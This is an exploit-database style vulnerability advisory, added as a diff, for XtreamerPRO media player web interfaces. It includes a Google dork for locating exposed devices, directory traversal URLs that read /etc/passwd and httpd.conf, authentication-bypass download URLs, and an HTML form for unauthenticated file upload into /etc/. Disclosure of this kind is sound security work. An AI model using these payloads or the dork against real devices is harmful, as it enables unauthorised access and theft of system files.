@@ -1,0 +1,64 @@
+# Exploit Title: XtreamerPRO Media-player and streamer multiple vulnerabilities
+# Google Dork: intitle:Xtreamer Media Server + "2009 Xtreamer.net, All right reserved."
+# Date: 15/05/2011
+# Author: Itzik Chen
+# Software Link: www.xtreamer.net
+# Version: ver 2.6.0, 2.7.0
+# Tested on: Windows XP SP3 Eng
+
+
+
+Summary
+================
+
+XtreamerPro is a popular media-player and streamer with
+an optional web interface management.
+
+
+
+Description
+================
+
+XtreamerPro suffers from a directory traversal with 
+appending the '/' character in the HTTP GET method of the
+affected host address. XtreamerPro also prone to an 
+authentication bypass vulnerability. This vulnerability 
+can be exploited by remote attackers to access sensitive
+data on the server without being authenticated. The attacker
+can also upload files to any location on the server, without
+being authenticated, using a multipart/form-data post.
+
+
+
+
+Proof of Concept
+================
+
+directory traversal:
+
+http://192.168.2.100/otherlist.php?dir=/%2f../%2f../etc/passwd
+http://192.168.2.100/otherlist.php?dir=/%2f../%2f../etc/httpd.conf
+
+
+
+
+Authentication bypass:
+
+http://192.168.2.100/download.php?dir=/%2f../%2f../etc/&file=passwd
+http://192.168.2.100/download.php?dir=/%2f../%2f../etc/&file=httpd.conf
+
+
+
+Authentication bypass - upload file:
+
+<form id="form1" name="write_form" action="http://192.168.2.100/upload_file.php?dir=/%2f../%2f../etc/" method="post" enctype="multipart/form-data"> 
+	<INPUT TYPE=FILE name="Filedata" id="Filedata">
+	<input type=submit>
+</form> 
+
+
+
+DEMO video:
+http://www.youtube.com/watch?v=QZtiuYyA8XU
+
+
